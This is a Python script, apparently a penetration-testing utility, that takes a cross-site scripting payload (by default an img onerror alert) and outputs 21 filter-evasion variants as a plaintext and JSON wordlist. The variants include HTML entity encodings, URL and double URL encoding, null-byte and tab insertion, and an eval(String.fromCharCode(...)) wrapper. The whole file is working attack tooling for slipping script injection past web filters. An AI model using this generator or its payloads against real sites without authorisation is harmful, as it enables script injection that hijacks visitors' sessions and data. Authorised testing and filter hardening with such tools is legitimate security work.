#!/usr/bin/env python3
"""
XSS Variant Generator - Clean output with Plaintext + JSON
Usage: python3 xss_variants.py "<your payload>"
Example: python3 xss_variants.py '<img src="x" onerror="alert(1)">'
"""

import sys
import json
import urllib.parse
import base64
from datetime import datetime

class XSSVariantGenerator:
    def __init__(self, payload):
        self.payload = payload
        self.variants = []
        
    def generate_all(self):
        """Generate all variants and return as list of dicts"""
        self.variants = []
        
        # 1. Original
        self.variants.append({
            "type": "original",
            "description": "Original payload",
            "payload": self.payload
        })
        
        # 2. Case variations
        self.variants.append({
            "type": "case_upper",
            "description": "All uppercase",
            "payload": self.payload.upper()
        })
        
        self.variants.append({
            "type": "case_lower",
            "description": "All lowercase",
            "payload": self.payload.lower()
        })
        
        self.variants.append({
            "type": "case_mixed",
            "description": "Mixed case (alternating)",
            "payload": self._mixed_case(self.payload)
        })
        
        # 3. Decimal HTML entity
        self.variants.append({
            "type": "decimal_entity",
            "description": "Full decimal HTML entity",
            "payload": self._to_decimal_entity(self.payload)
        })
        
        # 4. Decimal with leading zeros (4 digits)
        self.variants.append({
            "type": "decimal_entity_4digit",
            "description": "Decimal HTML entity (4-digit leading zeros)",
            "payload": self._to_decimal_entity_padded(self.payload, 4)
        })
        
        # 5. Decimal with leading zeros (5 digits)
        self.variants.append({
            "type": "decimal_entity_5digit",
            "description": "Decimal HTML entity (5-digit leading zeros)",
            "payload": self._to_decimal_entity_padded(self.payload, 5)
        })
        
        # 6. Hex HTML entity
        self.variants.append({
            "type": "hex_entity",
            "description": "Hexadecimal HTML entity",
            "payload": self._to_hex_entity(self.payload)
        })
        
        # 7. Hex with leading zeros (4 digits)
        self.variants.append({
            "type": "hex_entity_4digit",
            "description": "Hexadecimal HTML entity (4-digit leading zeros)",
            "payload": self._to_hex_entity_padded(self.payload, 4)
        })
        
        # 8. Mixed decimal and hex
        self.variants.append({
            "type": "mixed_entity",
            "description": "Mixed decimal/hex HTML entity",
            "payload": self._mixed_entity(self.payload)
        })
        
        # 9. URL encoded
        self.variants.append({
            "type": "url_encoded",
            "description": "URL encoded",
            "payload": urllib.parse.quote(self.payload)
        })
        
        # 10. Double URL encoded
        self.variants.append({
            "type": "double_url_encoded",
            "description": "Double URL encoded",
            "payload": urllib.parse.quote(urllib.parse.quote(self.payload))
        })
        
        # 11. Null byte insertion
        self.variants.append({
            "type": "null_byte",
            "description": "Null byte inserted after first character",
            "payload": self._insert_null_byte(self.payload)
        })
        
        # 12. Tab insertion
        self.variants.append({
            "type": "tab_insert",
            "description": "Tab inserted after first character",
            "payload": self._insert_tab(self.payload)
        })
        
        # 13. Tab as decimal entity
        self.variants.append({
            "type": "tab_decimal_entity",
            "description": "Tab as decimal entity after first character",
            "payload": self._insert_tab_entity(self.payload)
        })
        
        # 14. Tab as hex entity
        self.variants.append({
            "type": "tab_hex_entity",
            "description": "Tab as hex entity after first character",
            "payload": self._insert_tab_hex_entity(self.payload)
        })
        
        # 15. Newline as decimal entity
        self.variants.append({
            "type": "newline_decimal_entity",
            "description": "Newline as decimal entity after first character",
            "payload": self._insert_newline_entity(self.payload)
        })
        
        # 16. Newline as hex entity
        self.variants.append({
            "type": "newline_hex_entity",
            "description": "Newline as hex entity after first character",
            "payload": self._insert_newline_hex_entity(self.payload)
        })
        
        # 17. String.fromCharCode (requires script context)
        self.variants.append({
            "type": "fromcharcode",
            "description": "String.fromCharCode wrapper (requires <script> context)",
            "payload": self._to_fromcharcode(self.payload)
        })
        
        # 18. Base64
        self.variants.append({
            "type": "base64",
            "description": "Base64 encoded",
            "payload": base64.b64encode(self.payload.encode()).decode()
        })
        
        # 19. HTML Entity - only angle brackets
        self.variants.append({
            "type": "angle_brackets_only",
            "description": "Angle brackets only (HTML encoded)",
            "payload": self._encode_angle_brackets(self.payload)
        })
        
        # 20. HTML Entity - only quotes
        self.variants.append({
            "type": "quotes_only",
            "description": "Quotes only (HTML encoded)",
            "payload": self._encode_quotes(self.payload)
        })
        
        # 21. URL encoded + HTML entity mixed
        self.variants.append({
            "type": "url_html_mix",
            "description": "Mixed URL and HTML encoding",
            "payload": self._url_html_mix(self.payload)
        })
        
        return self.variants
    
    def _mixed_case(self, s):
        result = []
        for i, char in enumerate(s):
            if char.isalpha():
                if i % 2 == 0:
                    result.append(char.upper())
                else:
                    result.append(char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _to_decimal_entity(self, s):
        return ''.join(f'&#{ord(c)};' for c in s)
    
    def _to_decimal_entity_padded(self, s, width=4):
        return ''.join(f'&#{ord(c):0{width}d};' for c in s)
    
    def _to_hex_entity(self, s):
        return ''.join(f'&#x{ord(c):x};' for c in s)
    
    def _to_hex_entity_padded(self, s, width=4):
        return ''.join(f'&#x{ord(c):0{width}x};' for c in s)
    
    def _mixed_entity(self, s):
        result = []
        for i, c in enumerate(s):
            if i % 2 == 0:
                result.append(f'&#{ord(c)};')
            else:
                result.append(f'&#x{ord(c):x};')
        return ''.join(result)
    
    def _insert_null_byte(self, s):
        if len(s) < 2:
            return s
        return s[0] + '%00' + s[1:]
    
    def _insert_tab(self, s):
        if len(s) < 2:
            return s
        return s[0] + '\t' + s[1:]
    
    def _insert_tab_entity(self, s):
        if len(s) < 2:
            return s
        return s[0] + '&#9;' + s[1:]
    
    def _insert_tab_hex_entity(self, s):
        if len(s) < 2:
            return s
        return s[0] + '&#x9;' + s[1:]
    
    def _insert_newline_entity(self, s):
        if len(s) < 2:
            return s
        return s[0] + '&#10;' + s[1:]
    
    def _insert_newline_hex_entity(self, s):
        if len(s) < 2:
            return s
        return s[0] + '&#xA;' + s[1:]
    
    def _to_fromcharcode(self, s):
        char_codes = ','.join(str(ord(c)) for c in s)
        return f'eval(String.fromCharCode({char_codes}))'
    
    def _encode_angle_brackets(self, s):
        return s.replace('<', '&lt;').replace('>', '&gt;')
    
    def _encode_quotes(self, s):
        return s.replace('"', '&quot;').replace("'", '&#39;')
    
    def _url_html_mix(self, s):
        # URL encode some characters, HTML encode others
        result = []
        for i, c in enumerate(s):
            if i % 3 == 0:
                result.append(urllib.parse.quote(c))
            elif i % 3 == 1:
                result.append(f'&#{ord(c)};')
            else:
                result.append(c)
        return ''.join(result)
    
    def get_plaintext_wordlist(self):
        """Return just the payloads as a flat list"""
        return [v["payload"] for v in self.variants]
    
    def get_json_output(self):
        """Return full structured JSON"""
        return {
            "metadata": {
                "generated": datetime.now().isoformat(),
                "original_payload": self.payload,
                "total_variants": len(self.variants)
            },
            "variants": self.variants
        }
    
    def print_plaintext(self):
        """Print only the payloads, one per line"""
        for variant in self.variants:
            print(variant["payload"])
    
    def save_plaintext(self, filename="wordlist.txt"):
        """Save plaintext wordlist to file"""
        with open(filename, 'w', encoding='utf-8') as f:
            for variant in self.variants:
                f.write(variant["payload"] + "\n")
        print(f"[+] Plaintext wordlist saved to: {filename}")
    
    def save_json(self, filename="wordlist.json"):
        """Save JSON to file"""
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.get_json_output(), f, indent=2, ensure_ascii=False)
        print(f"[+] JSON wordlist saved to: {filename}")

def main():
    # Check if payload provided
    if len(sys.argv) > 1:
        payload = ' '.join(sys.argv[1:])
    else:
        payload = '<img src="x" onerror="alert(1)">'
        print("=" * 80)
        print("NO PAYLOAD PROVIDED. Using default payload:")
        print(f"    {payload}")
        print("=" * 80)
        print("To use your own: python3 xss_variants.py '<your payload>'")
        print()
    
    generator = XSSVariantGenerator(payload)
    generator.generate_all()
    
    # Output options
    print("\n" + "=" * 80)
    print("PLAINTEXT WORDLIST (one payload per line):")
    print("=" * 80)
    print()
    generator.print_plaintext()
    
    print("\n" + "=" * 80)
    print("JSON OUTPUT (structured with metadata):")
    print("=" * 80)
    print()
    print(json.dumps(generator.get_json_output(), indent=2, ensure_ascii=False))
    
    # Save to files
    generator.save_plaintext("wordlist.txt")
    generator.save_json("wordlist.json")
    
    print(f"\n[+] Total variants generated: {len(generator.variants)}")

if __name__ == "__main__":
    main()
